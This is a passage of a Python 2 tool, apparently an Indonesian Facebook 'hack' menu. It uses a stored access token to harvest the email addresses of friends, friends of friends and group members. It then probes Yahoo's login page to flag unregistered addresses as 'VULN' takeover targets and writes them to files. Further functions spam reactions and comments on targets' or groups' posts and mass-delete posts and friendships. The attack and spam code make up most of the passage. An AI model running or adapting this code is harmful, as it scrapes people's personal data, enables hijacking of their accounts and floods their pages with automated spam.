        menu_hack()
    else:
        run ('[!] Invalid input!')
        time.sleep(2)
        brute()
        #Function_The_End
def menu_yahoo():
    global toket
    os.system('clear')
    try:
        toket = open('AGITFOLDER/logs/fb_token.txt', 'r').read()
    except IOError:
        run('[!] Token not found !')
        os.system('rm -rf AGITFOLDER/logs/fb_token.txt')
        time.sleep(0.01)
        login()
    os.system('clear')
    banner_1()
    print 48 * (('{}─{}').format(black, finished))
    print (('{}[{}01{}] {}Clone from friend{}').format(yellow, blue, yellow, white, finished))
    print (('{}[{}02{}] {}Clone friend of friends{}').format(yellow, blue, yellow, white, finished))
    print (('{}[{}03{}] {}Clone from group member{}').format(yellow, blue, yellow, white, finished))
    print (('{}[{}04{}] {}Clone from file{}').format(yellow, blue, yellow, white, finished))
    print (('{}[{}00{}] {}Go Back{}').format(yellow, blue, yellow, red, finished))
    print 48 * (('{}─{}').format(black, finished))
    yahoo_pilih()
def yahoo_pilih():
    go = raw_input(('{}║\n╚══{}➤ {}').format(black, red, finished))
    if go == '1' or go == '01':
        yahoofriends()
    elif go == '2' or go == '02':
        yahoofromfriends()
    elif go == '3' or go == '03':
        yahoomember()
    elif go == '4' or go == '04':
        yahoolist()
    elif go == '0' or go == '00':
        menu_hack()
    else:
        run ('[!] Invalid input!')
        time.sleep(2)
        menu_yahoo()
def yahoofriends():
    global toket
    os.system('clear')
    try:
        toket = open('AGITFOLDER/logs/fb_token.txt', 'r').read()
    except IOError:
        run('[!] Token not found !')
        os.system('rm -rf AGITFOLDER/logs/fb_token.txt')
        time.sleep(0.01)
        login()
    try:
        os.mkdir('/sdcard/HTTPNET/')
    except OSError:
        pass
    os.system('clear')
    banner_1()
    print 48 * (('{}─{}').format(black, finished))
    mpsh = []
    jml = 0
    jalan (('{}[{}✺{}] {}Getting all email from friends{}...{}').format(red, green, red, green, black, finished))
    friend = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
    kimak = json.loads(friend.text)
    save = open('/sdcard/HTTPNET/MailVuln.txt', 'w')
    jalan(('{}[{}✸{}] {}Start cloning{}...{}').format(red, cyan, red, green, black, finished))
    print 48 * (('{}\xe2\x95\x90{}').format(black, finished))
    for w in kimak['data']:
        jml += 1
        mpsh.append(jml)
        id = w['id']
        nama = w['name']
        links = requests.get('https://graph.facebook.com/' + id + '?access_token=' + toket)
        z = json.loads(links.text)
        try:
            mail = z['email']
            yahoo = re.compile('@.*')
            otw = yahoo.search(mail).group()
            if 'yahoo.com' in otw:
                br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
                br._factory.is_html = True
                br.select_form(nr=0)
                br['username'] = mail
                klik = br.submit().read()
                jok = re.compile('"messages.ERROR_INVALID_USERNAME">.*')
                try:
                    pek = jok.search(klik).group()
                except:
                    continue
                if '"messages.ERROR_INVALID_USERNAME">' in pek:
                    save.write(mail + '\n')
                    print (('{}[{}VULN✓{}] {}' + mail + ' {}=>{}' + nama + '{}').format(red, cyan, red, green, black, white, finished))
                    berhasil.append(mail)
                    save = open('/sdcard/HTTPNET/MailVuln.txt', 'a')
        except KeyError:
            pass
    print 48 * (('{}\xe2\x95\x90{}').format(black, finished))
    print (('{}[{}✓{}] {}Done{}...{}').format(red, cyan, red, green, black, finished))
    print (('{}[{}+{}] {}Total {}: {}' + str(len(berhasil)) + '{}').format(red, blue, red, green, red, white, finished))
    print (('{}[{}+{}] {}File saved {}: {}Successful{}').format(red, purple, red, green, red, white, finished))
    save.close()
    raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
    menu_yahoo()
    #Function_The_End
def yahoofromfriends():
    global toket
    os.system('clear')
    try:
        toket = open('AGITFOLDER/logs/fb_token.txt', 'r').read()
    except IOError:
        run('[!] Token not found !')
        os.system('rm -rf AGITFOLDER/logs/fb_token.txt')
        time.sleep(0.01)
        login()
    try:
        os.mkdir('/sdcard/HTTPNET/')
    except OSError:
        pass
    os.system('clear')
    banner_1()
    print 48 * (('{}─{}').format(black, finished))
    mpsh = []
    jml = 0
    idt = raw_input (('{}[{}+{}] {}Input friend/Id {}: {}').format(red, green, red, white, red, green))
    try:
        jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
        op = json.loads(jok.text)
        print (('{}[{}✓{}] {}Profile Name {}: {}' + op['name'] + '{}').format(red, green, red, white, red, green, finished))
    except KeyError:
        print (('{}[!] Error!').format(red, finished))
        raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
        menu_yahoo()
    jalan (('{}[{}✺{}] {}Getting all friend email of friends{}...{}').format(red, green, red, white, black, finished))
    friend = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
    kimak = json.loads(friend.text)
    save = open('/sdcard/HTTPNET/FriendMailVuln.txt', 'w')
    jalan(('{}[{}✸{}] {}Start cloning{}...{}').format(red, cyan, red, green, black, finished))
    print 48 * (('{}\xe2\x95\x90{}').format(black, finished))
    for w in kimak['data']:
        jml += 1
        mpsh.append(jml)
        id = w['id']
        nama = w['name']
        links = requests.get('https://graph.facebook.com/' + id + '?access_token=' + toket)
        z = json.loads(links.text)
        try:
            mail = z['email']
            yahoo = re.compile('@.*')
            otw = yahoo.search(mail).group()
            if 'yahoo.com' in otw:
                br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
                br._factory.is_html = True
                br.select_form(nr=0)
                br['username'] = mail
                klik = br.submit().read()
                jok = re.compile('"messages.ERROR_INVALID_USERNAME">.*')
                try:
                    pek = jok.search(klik).group()
                except:
                    continue
                if '"messages.ERROR_INVALID_USERNAME">' in pek:
                    save.write(mail + '\n')
                    print (('{}[{}VULN✓{}] {}' + mail + ' {}=>{}' + nama + '{}').format(red, cyan, red, green, black, white, finished))
                    berhasil.append(mail)
                    save = open('/sdcard/HTTPNET/FriendMailVuln.txt', 'a')
        except KeyError:
            pass
    print 48 * (('{}\xe2\x95\x90{}').format(black, finished))
    print (('{}[{}✓{}] {}Done{}...{}').format(red, cyan, red, green, black, finished))
    print (('{}[{}+{}] {}Total {}: {}' + str(len(berhasil)) + '{}').format(red, blue, red, green, red, white, finished))
    print (('{}[{}+{}] {}File saved {}: {}Successful{}').format(red, purple, red, green, red, white, finished))
    save.close()
    raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
    menu_yahoo()
    #Function_The_End
def yahoomember():
    global toket
    os.system('clear')
    try:
        toket = open('AGITFOLDER/logs/fb_token.txt', 'r').read()
    except IOError:
        run('[!] Token not found !')
        os.system('rm -rf AGITFOLDER/logs/fb_token.txt')
        time.sleep(0.01)
        login()
    try:
        os.mkdir('/sdcard/HTTPNET/')
    except OSError:
        pass
    os.system('clear')
    banner_1()
    print 48 * (('{}─{}').format(black, finished))
    mpsh = []
    jml = 0
    id = raw_input (('{}[{}+{}] {}Input group/id {}: {}').format(red, yellow, red, green, red, finished))
    try:
        r = requests.get('https://graph.facebook.com/group/?id=' + id + '&access_token=' + toket)
        asw = json.loads(r.text)
        print (('{}[{}✓{}] {}Name group {}: {}' + asw['name'] + '{}').format(red, green, red, green, red, white, finished))
    except KeyError:
        print (('{}[!] Error!').format(red, finished))
        raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
        menu_yahoo()
    jalan (('{}[{}✺{}] {}Getting all email from group{}...{}').format(red, green, red, green, black, finished))
    friend = requests.get('https://graph.facebook.com/' + id + '/members?fields=name,id&limit=999999999&access_token=' + toket)
    kimak = json.loads(friend.text)
    save = open('/sdcard/HTTPNET/GrupMailVuln.txt', 'w')
    jalan('\x1b[1;91m[✺] \x1b[1;92mStart \x1b[1;97m...')
    print 48 * (('{}\xe2\x95\x90{}').format(black, finished))
    for w in kimak['data']:
        jml += 1
        mpsh.append(jml)
        id = w['id']
        nama = w['name']
        links = requests.get('https://graph.facebook.com/' + id + '?access_token=' + toket)
        z = json.loads(links.text)
        try:
            mail = z['email']
            yahoo = re.compile('@.*')
            otw = yahoo.search(mail).group()
            if 'yahoo.com' in otw:
                br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
                br._factory.is_html = True
                br.select_form(nr=0)
                br['username'] = mail
                klik = br.submit().read()
                jok = re.compile('"messages.ERROR_INVALID_USERNAME">.*')
                try:
                    pek = jok.search(klik).group()
                except:
                    continue
                if '"messages.ERROR_INVALID_USERNAME">' in pek:
                    save.write(mail + '\n')
                    print (('{}[{}VULN✓{}] {}' + mail + ' {}=>{}' + nama + '{}').format(red, cyan, red, green, black, white, finished))
                    berhasil.append(mail)
                    save = open('/sdcard/HTTPNET/GrupMailVuln.txt', 'a')
        except KeyError:
            pass
    print 48 * (('{}\xe2\x95\x90{}').format(black, finished))
    print (('{}[{}✓{}] {}Done{}...{}').format(red, cyan, red, green, black, finished))
    print (('{}[{}+{}] {}Total {}: {}' + str(len(berhasil)) + '{}').format(red, blue, red, green, red, white, finished))
    print (('{}[{}+{}] {}File saved {}: {}Successful{}').format(red, purple, red, green, red, white, finished))
    save.close()
    raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
    menu_yahoo()
    #Function_The_End
def yahoolist():
    global toket
    os.system('clear')
    try:
        toket = open('AGITFOLDER/logs/fb_token.txt', 'r').read()
    except IOError:
        run('[!] Token not found !')
        os.system('rm -rf AGITFOLDER/logs/fb_token.txt')
        time.sleep(0.01)
        login()
    try:
        os.mkdir('/sdcard/HTTPNET/')
    except OSError:
        pass
    os.system('clear')
    banner_1()
    print 48 * (('{}─{}').format(black, finished))
    files = raw_input(('{}[{}+{}] {}Input File {}: {}').format(red, white, red, green, red, finished))
    try:
        total = open(files, 'r')
        mail = total.readlines()
    except IOError:
        print (('{}[!] Error not found!{}').format(red, finished))
        raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
        menu_yahoo()
    mpsh = []
    jml = 0
    jalan(('{}[{}✸{}] {}Start cloning{}...{}').format(red, cyan, red, green, black, finished))
    save = open('/sdcard/HTTPNET/FileMailVuln.txt', 'w')
    print 48 * (('{}\xe2\x95\x90{}').format(black, finished))
    mail = open(files, 'r').readlines()
    for pw in mail:
        mail = pw.replace('\n', '')
        jml += 1
        mpsh.append(jml)
        yahoo = re.compile('@.*')
        otw = yahoo.search(mail).group()
        if 'yahoo.com' in otw:
            br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
            br._factory.is_html = True
            br.select_form(nr=0)
            br['username'] = mail
            klik = br.submit().read()
            jok = re.compile('"messages.ERROR_INVALID_USERNAME">.*')
            try:
                pek = jok.search(klik).group()
            except:
                continue
            if '"messages.ERROR_INVALID_USERNAME">' in pek:
                save.write(mail + '\n')
                print (('{}[{}VULN✓{}] {}' + mail + '{}').format(red, cyan, red, green, finished))
                berhasil.append(mail)
                save = open('/sdcard/HTTPNET/FileMailVuln.txt', 'a')
    print 48 * (('{}\xe2\x95\x90{}').format(black, finished))
    print (('{}[{}✓{}] {}Done{}...{}').format(red, cyan, red, green, black, finished))
    print (('{}[{}+{}] {}Total {}: {}' + str(len(berhasil)) + '{}').format(red, blue, red, green, red, white, finished))
    print (('{}[{}+{}] {}File saved {}: {}Successful{}').format(red, purple, red, green, red, white, finished))
    save.close()
    raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
    menu_yahoo()
    #Function_The_End
def menu_bot():
    os.system('clear')
    try:
        toket = open('AGITFOLDER/logs/fb_token.txt', 'r').read()
    except IOError:
        run('[!] Token not found !')
        os.system('rm -rf AGITFOLDER/logs/fb_token.txt')
        time.sleep(1)
        login()
    os.system('clear')
    banner_1()
    print 48 * (('{}─{}').format(black, finished))
    print (('{}[{}01{}] {}Bot React Post Target{}').format(yellow, blue, yellow, white, finished))
    print (('{}[{}02{}] {}Bot React Group Post{}').format(yellow, blue, yellow, white, finished))
    print (('{}[{}03{}] {}Bot Comment Target Post{}').format(yellow, blue, yellow, white, finished))
    print (('{}[{}04{}] {}Bot Comment Group Post{}').format(yellow, blue, yellow, white, finished))
    print (('{}[{}05{}] {}Create Post{}').format(yellow, blue, yellow, white, finished))
    print (('{}[{}06{}] {}Delete Post{}').format(yellow, blue, yellow, white, finished))
    print (('{}[{}07{}] {}Confirm friendship{}').format(yellow, blue, yellow, white, finished))
    print (('{}[{}08{}] {}Remove friendship{}').format(yellow, blue, yellow, white, finished))
    print (('{}[{}00{}] {}Go Back{}').format(yellow, blue, yellow, red, finished))
    print 48 * (('{}─{}').format(black, finished))
    bot_pilih()
def bot_pilih():
    array4 = raw_input(('{}║\n╚══{}➤ {}').format(black, red, finished))
    if array4 == '1' or array4 == '01':
        menu_react()
    elif array4 == '2' or array4 == '02':
        grup_react()
    elif array4 == '3' or array4 == '03':
        bot_komen()
    elif array4 == '4' or array4 == '04':
        grup_komen()
    elif array4 == '5' or array4 == '05':
        status()
    elif array4 == '6' or array4 == '06':
        deletepost()
    elif array4 == '7' or array4 == '07':
        accept()
    elif array4 == '8' or array4 == '08':
        unfriend()
    elif array4 == '0' or array4 == '00':
        menu()
    else:
        run ('[!] Invalid input!')
        time.sleep(2)
        menu_bot()
def menu_react():
    os.system('clear')
    try:
        toket = open('AGITFOLDER/logs/fb_token.txt', 'r').read()
    except IOError:
        run('[!] Token not found !')
        os.system('rm -rf AGITFOLDER/logs/fb_token.txt')
        time.sleep(1)
        login()
    os.system('clear')
    banner_1()
    print 48 * (('{}─{}').format(black, finished))
    print (('{}[{}01{}] {}Like{}').format(yellow, blue, yellow, white, finished))
    print (('{}[{}02{}] {}Love{}').format(yellow, blue, yellow, white, finished))
    print (('{}[{}03{}] {}Care{}').format(yellow, blue, yellow, white, finished))
    print (('{}[{}04{}] {}Wow{}').format(yellow, blue, yellow, white, finished))
    print (('{}[{}05{}] {}Haha{}').format(yellow, blue, yellow, white, finished))
    print (('{}[{}06{}] {}Sadboy{}').format(yellow, blue, yellow, white, finished))
    print (('{}[{}07{}] {}Angry{}').format(yellow, blue, yellow, white, finished))
    print (('{}[{}00{}] {}Go Back{}').format(yellow, blue, yellow, red, finished))
    print 48 * (('{}─{}').format(black, finished))
    react_pilih()
def react_pilih():
    global tipe
    aksi = raw_input(('{}║\n╚══{}➤ {}').format(black, red, finished))
    if aksi == '1' or aksi == '01':
        tipe = 'LIKE'
        react()
    elif aksi == '2' or aksi == '02':
        tipe = 'LOVE'
        react()
    elif aksi == '3' or aksi == '03':
        tipe = 'CARE'
        react()
    elif aksi == '4' or aksi == '04':
        tipe = 'WOW'
        react()
    elif aksi == '5' or aksi == '05':
        tipe = 'HAHA'
        react()
    elif aksi == '6' or aksi == '06':
        tipe = 'SAD'
        react()
    elif aksi == '7' or aksi == '07':
        tipe = 'ANGRY'
        react()
    elif aksi == '0' or aksi == '00':
        menu_bot()
    else:
        run ('[!] Invalid input!')
        time.sleep(2)
        menu_react()
def react():
    os.system('clear')
    try:
        toket = open('AGITFOLDER/logs/fb_token.txt', 'r').read()
    except IOError:
        run('[!] Token not found !')
        os.system('rm -rf AGITFOLDER/logs/fb_token.txt')
        time.sleep(0.01)
        login()
    os.system('clear')
    banner_1()
    print 48 * (('{}─{}').format(black, finished))
    ide = raw_input(('{}[{}+{}] {}Input ID Target {}: {}').format(red, yellow, red, white, red, green))
    limit = raw_input(('{}[{}!{}] {}Limit {}: {}').format(red, white, red, white, red, green))
    try:
        oh = requests.get('https://graph.facebook.com/' + ide + '?fields=feed.limit(' + limit + ')&access_token=' + toket)
        ah = json.loads(oh.text)
        jalan (('{}[{}✺{}] {}Start sending{}...{}').format(red, green, red, green, black, finished))
        print 48 * (('{}\xe2\x95\x90{}').format(black, finished))
        for a in ah['feed']['data']:
            y = a['id']
            reaksi.append(y)
            requests.post('https://graph.facebook.com/' + y + '/reactions?type=' + tipe + '&access_token=' + toket)
            print (('{}[{}' + y[:10].replace('\n', ' ') + '... {}] {}' + tipe + '{}').format(green, white, green, white, finished))
        print 48 * (('{}\xe2\x95\x90{}').format(black, finished))
        print (('\r{}[{}+{}] {}Done {}' + str(len(reaksi)) + '{}').format(red, green, red, green, white, green))
        raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
        menu_react()
    except KeyError:
        print (('{}[!] Error!').format(red, finished))
        raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
        menu_react()
        #Function_The_End
def grup_react():
    os.system('clear')
    try:
        toket = open('AGITFOLDER/logs/fb_token.txt', 'r').read()
    except IOError:
        run('[!] Token not found !')
        os.system('rm -rf AGITFOLDER/logs/fb_token.txt')
        time.sleep(0.01)
        login()
    os.system('clear')
    banner_1()
    print 48 * (('{}─{}').format(black, finished))
    print (('{}[{}01{}] {}Like{}').format(yellow, blue, yellow, white, finished))
    print (('{}[{}02{}] {}Love{}').format(yellow, blue, yellow, white, finished))
    print (('{}[{}03{}] {}Care{}').format(yellow, blue, yellow, white, finished))
    print (('{}[{}04{}] {}Wow{}').format(yellow, blue, yellow, white, finished))
    print (('{}[{}05{}] {}Haha{}').format(yellow, blue, yellow, white, finished))
    print (('{}[{}06{}] {}Sadboy{}').format(yellow, blue, yellow, white, finished))
    print (('{}[{}07{}] {}Angry{}').format(yellow, blue, yellow, white, finished))
    print (('{}[{}00{}] {}Go Back{}').format(yellow, blue, yellow, red, finished))
    print 48 * (('{}─{}').format(black, finished))
    reactg_pilih()
def reactg_pilih():
    global tipe
    aksi = raw_input(('{}║\n╚══{}➤ {}').format(black, red, finished))
    if aksi == '1' or aksi == '01':
        tipe = 'LIKE'
        reactg()
    elif aksi == '2' or aksi == '02':
        tipe = 'LOVE'
        reactg()
    elif aksi == '3' or aksi == '03':
        tipe = 'CARE'
        reactg()
    elif aksi == '4' or aksi == '04':
        tipe = 'WOW'
        reactg()
    elif aksi == '5' or aksi == '05':
        tipe = 'HAHA'
        reactg()
    elif aksi == '6' or aksi == '06':
        tipe = 'SAD'
        reactg()
    elif aksi == '7' or aksi == '07':
        tipe = 'ANGRY'
        reactg()
    elif aksi == '0' or aksi == '00':
        menu_bot()
    else:
        run ('[!] Invalid input!')
        time.sleep(2)
        grup_react()
def reactg():
    os.system('clear')
    try:
        toket = open('AGITFOLDER/logs/fb_token.txt', 'r').read()
    except IOError:
        run('[!] Token not found !')
        os.system('rm -rf AGITFOLDER/logs/fb_token.txt')
        time.sleep(0.01)
        login()
    os.system('clear')
    banner_1()
    print 48 * (('{}─{}').format(black, finished))
    ide = raw_input(('{}[{}+{}] {}Input ID Group {}: {}').format(red, yellow, red, green, red, white))
    limit = raw_input(('{}[{}!{}] {}Limit {}: {}').format(red, white, red, green, red, white))
    try:
        r = requests.get('https://graph.facebook.com/group/?id=' + ide + '&access_token=' + toket)
        asw = json.loads(r.text)
        print (('{}[{}✓{}] {}Name group {}: {}' + asw['name'] + '{}').format(red, green, red, green, red, white, finished))
    except KeyError:
        print (('{}[!] Error!').format(red, finished))
        raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
        grup_react()
    try:
        oh = requests.get('https://graph.facebook.com/v3.0/' + ide + '?fields=feed.limit(' + limit + ')&access_token=' + toket)
        ah = json.loads(oh.text)
        jalan (('{}[{}✺{}] {}Start sending{}...{}').format(red, green, red, green, black, finished))
        print 48 * (('{}\xe2\x95\x90{}').format(black, finished))
        for a in ah['feed']['data']:
            y = a['id']
            reaksigrup.append(y)
            requests.post('https://graph.facebook.com/' + y + '/reactions?type=' + tipe + '&access_token=' + toket)
            print (('{}[{}' + y[:10].replace('\n', ' ') + '... {}] {}' + tipe + '{}').format(green, white, green, white, finished))
        print 48 * (('{}\xe2\x95\x90{}').format(black, finished))
        print (('\r{}[{}+{}] {}Done {}' + str(len(reaksigrup)) + '{}').format(red, green, red, green, white, green))
        raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
        grup_react()
    except KeyError:
        print (('{}[!] Error!').format(red, finished))
        raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
        grup_react()
        #Function_The_End
def bot_komen():
    os.system('clear')
    try:
        toket = open('AGITFOLDER/logs/fb_token.txt', 'r').read()
    except IOError:
        run('[!] Token not found !')
        os.system('rm -rf AGITFOLDER/logs/fb_token.txt')
        time.sleep(0.01)
        login()
    os.system('clear')
    banner_1()
    print (("{}[{}INFO{}] {}Use {}'<n>' {}for new line ex{}: {}Hi👋<n>hello{}").format(red, blue, red, yellow, red, yellow, red, white, finished))
    print 48 * (('{}─{}').format(black, finished))
    ide = raw_input(('{}[{}+{}] {}Input ID Target {}: {}').format(red, yellow, red, white, red, green))
    km = raw_input(('{}[{}!{}] {}Comment {}: {}').format(red, blue, red, white, red, green))
    limit = raw_input(('{}[{}!{}] {}Limit {}: {}').format(red, white, red, white, red, green))
    km = km.replace('<n>', '\n')
    try:
        p = requests.get('https://graph.facebook.com/' + ide + '?fields=feed.limit(' + limit + ')&access_token=' + toket)
        a = json.loads(p.text)
        jalan (('{}[{}✺{}] {}Start sending{}...{}').format(red, green, red, green, black, finished))
        print 48 * (('{}\xe2\x95\x90{}').format(black, finished))
        for s in a['feed']['data']:
            f = s['id']
            komen.append(f)
            requests.post('https://graph.facebook.com/' + f + '/comments?message=' + km + '&access_token=' + toket)
            print (('{}[{}' + km[:10].replace('\n', ' ') + '... {}]').format(green, white, white))
        print 48 * (('{}\xe2\x95\x90{}').format(black, finished))
        print (('\r{}[{}+{}] {}Done {}' + str(len(komen)) + '{}').format(red, green, red, green, white, green))
        raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
        menu_bot()
    except KeyError:
        print (('{}[!] Error!').format(red, finished))
        raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
        menu_bot()
        #Function_The_End
def grup_komen():
    os.system('clear')
    try:
        toket = open('AGITFOLDER/logs/fb_token.txt', 'r').read()
    except IOError:
        run('[!] Token not found !')
        os.system('rm -rf AGITFOLDER/logs/fb_token.txt')
        time.sleep(0.01)
        login()
    os.system('clear')
    banner_1()
    print (("{}[{}INFO{}] {}Use {}'<n>' {}for new line ex{}: {}Hi👋<n>hello{}").format(red, blue, red, yellow, red, yellow, red, white, finished))
    print 48 * (('{}─{}').format(black, finished))
    ide = raw_input(('{}[{}+{}] {}Input ID Group {}: {}').format(red, yellow, red, green, red, white))
    km = raw_input(('{}[{}!{}] {}Comment {}: {}').format(red, blue, red, white, red, green))
    limit = raw_input(('{}[{}!{}] {}Limit {}: {}').format(red, white, red, white, red, green))
    km = km.replace('<n>', '\n')
    try:
        r = requests.get('https://graph.facebook.com/group/?id=' + ide + '&access_token=' + toket)
        asw = json.loads(r.text)
        print (('{}[{}✓{}] {}Name group {}: {}' + asw['name'] + '{}').format(red, green, red, green, red, white, finished))
    except KeyError:
        print (('{}[!] Error!').format(red, finished))
        raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
        menu_bot()
    try:
        p = requests.get('https://graph.facebook.com/v3.0/' + ide + '?fields=feed.limit(' + limit + ')&access_token=' + toket)
        a = json.loads(p.text)
        jalan (('{}[{}✺{}] {}Start sending{}...{}').format(red, green, red, green, black, finished))
        print 48 * (('{}\xe2\x95\x90{}').format(black, finished))
        for s in a['feed']['data']:
            f = s['id']
            komengrup.append(f)
            requests.post('https://graph.facebook.com/' + f + '/comments?message=' + km + '&access_token=' + toket)
            print (('{}[{}' + km[:10].replace('\n', ' ') + '... {}]').format(green, white, white))
        print 48 * (('{}\xe2\x95\x90{}').format(black, finished))
        print (('\r{}[{}+{}] {}Done {}' + str(len(komengrup)) + '{}').format(red, green, red, green, white, green))
        raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
        menu_bot()
    except KeyError:
        print (('{}[!] Error!').format(red, finished))
        raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
        menu_bot()
        #Function_The_End
def status():
    os.system('clear')
    try:
        toket = open('AGITFOLDER/logs/fb_token.txt', 'r').read()
    except IOError:
        run('[!] Token not found !')
        os.system('rm -rf AGITFOLDER/logs/fb_token.txt')
        time.sleep(0.01)
        login()
    os.system('clear')
    banner_1()
    print 48 * (('{}─{}').format(black, finished))
    msg = raw_input(('{}[{}+{}] {}Type status {}: {}').format(red, white, red, green, red, finished))
    if msg == '':
        print (('{}[!] Can not be empty{}').format(red, finished))
        raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
        menu_bot()
    else:
        res = requests.get('https://graph.facebook.com/me/feed?method=POST&message=' + msg + '&access_token=' + toket)
        op = json.loads(res.text)
        jalan(('{}[{}✸{}] {}Start creating{}...{}').format(red, cyan, red, green, black, finished))
        time.sleep(1)
        print 48 * (('{}\xe2\x95\x90{}').format(black, finished))
        print (('{}[{}+{}] {}Status ID {}: {}' + op['id'] + '{}').format(red, yellow, red, green, red, white, finished))
        raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
        menu_bot()
        #Function_The_End
def deletepost():
    os.system('clear')
    try:
        toket = open('AGITFOLDER/logs/fb_token.txt', 'r').read()
        nam = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        lol = json.loads(nam.text)
        nama = lol['name']
    except IOError:
        run('[!] Token not found !')
        os.system('rm -rf AGITFOLDER/logs/fb_token.txt')
        time.sleep(0.01)
        login()
    os.system('clear')
    banner_1()
    print 48 * (('{}─{}').format(black, finished))
    print (('{}[{}✓{}] {}Profile Name {}: {}' + nama + '{}').format(red, cyan, red, green, red, white, finished))
    jalan(('{}[{}✺{}] {}Start deleting{}...{}').format(red, green, red, green, black, finished))
    print 48 * (('{}\xe2\x95\x90{}').format(black, finished))
    asu = requests.get('https://graph.facebook.com/me/feed?access_token=' + toket)
    asus = json.loads(asu.text)
    for p in asus['data']:
        id = p['id']
        piro = 0
        url = requests.get('https://graph.facebook.com/' + id + '?method=delete&access_token=' + toket)
        ok = json.loads(url.text)
        try:
            error = ok['error']['message']
            print (('{}[{}' + id[:10].replace('\n', ' ') + '...' + '{}] {}Failed!{}').format(red, white, red, purple, finished))
        except TypeError:
            print (('{}[{}' + id[:10].replace('\n', ' ') + '...' + '{}] {}Deleted{}').format(green, white, green, cyan, finished))
            piro += 1
        except requests.exceptions.ConnectionError:
            print (('{}[!] {}No Connection Error{}!{}').format(red, white, red, finished))
            raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
            menu_bot()
    print 48 * (('{}\xe2\x95\x90{}').format(black, finished))
    print (('{}[{}+{}] {}Done.{}').format(red, yellow, red, green, finished))
    raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
    menu_bot()
    #Function_The_End
def accept():
    os.system('clear')
    try:
        toket = open('AGITFOLDER/logs/fb_token.txt', 'r').read()
    except IOError:
        run('[!] Token not found !')
        os.system('rm -rf AGITFOLDER/logs/fb_token.txt')
        time.sleep(0.01)
        login()
    os.system('clear')
    banner_1()
    print 48 * (('{}─{}').format(black, finished))
    limit = raw_input(('{}[{}!{}] {}Limit {}: {}').format(red, white, red, white, red, green))
    r = requests.get('https://graph.facebook.com/me/friendrequests?limit=' + limit + '&access_token=' + toket)
    friend = json.loads(r.text)
    if '[]' in str(friend['data']):
        print (('{}[!] No friend request!{}').format(red, finished))
        raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
        menu_bot()
    jalan(('{}[{}✺{}] {}Start adding{}...{}').format(red, green, red, green, black, finished))
    print 48 * (('{}\xe2\x95\x90{}').format(black, finished))
    for i in friend['data']:
        gas = requests.post('https://graph.facebook.com/me/friends/' + i['from']['id'] + '?access_token=' + toket)
        a = json.loads(gas.text)
        if 'error' in str(a):
            print (('{}[ {}Failed! {}] ' + i['from']['name'] + '{}').format(white, red, white))
        else:
            print (('{}[ {}Accept{} ] ' + i['from']['name'] + '{}').format(white, green, white))
    print 48 * (('{}\xe2\x95\x90{}').format(black, finished))
    print (('{}[{}+{}] {}Done.{}').format(red, yellow, red, green, finished))
    raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
    menu_bot()
    #Function_The_End
def unfriend():
    os.system('clear')
    try:
        toket = open('AGITFOLDER/logs/fb_token.txt', 'r').read()
    except IOError:
        run('[!] Token not found !')
        os.system('rm -rf AGITFOLDER/logs/fb_token.txt')
        time.sleep(0.01)
        login()
    os.system('clear')
    banner_1()
    print 48 * (('{}─{}').format(black, finished))
    jalan(('{}[{}✺{}] {}Start removing{}...{}').format(red, green, red, green, black, finished))
    jalan (('\n              {}Stop Press {}CTRL {}+ {}z\n {}If No results Use Airplane Mode For 5 Seconds{}...{}').format(white, cyan, red, cyan, white, black, finished))
    print 48 * (('{}\xe2\x95\x90{}').format(black, finished))
    try:
        pek = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
        cok = json.loads(pek.text)
        for i in cok['data']:
            nama = i['name']
            id = i['id']
            requests.delete('https://graph.facebook.com/me/friends?uid=' + id + '&access_token=' + toket)
            print (('{}[ {}Deleted {}] ' + nama + '{}').format(white, green, white, finished))
    except IndexError:
        pass
    except KeyboardInterrupt:
        print (('{}[!] Stopped!').format(red, finished))
        raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
        menu_bot()
    print (('{}[{}+{}] {}Done.{}').format(red, yellow, red, green, finished))
    raw_input(('\n {}[ {}Enter Back {}] {}').format(red, white, red, finished))
    menu_bot()
    #Function_The_End
def others():
    os.system('clear')
    try:
        toket = open('AGITFOLDER/logs/fb_token.txt', 'r').read()
    except IOError:
        run('[!] Token not found !')
        os.system('rm -rf AGITFOLDER/logs/fb_token.txt')
        time.sleep(0.01)
        login()
    os.system('clear')
    banner_1()
    print 48 * (('{}─{}').format(black, finished))
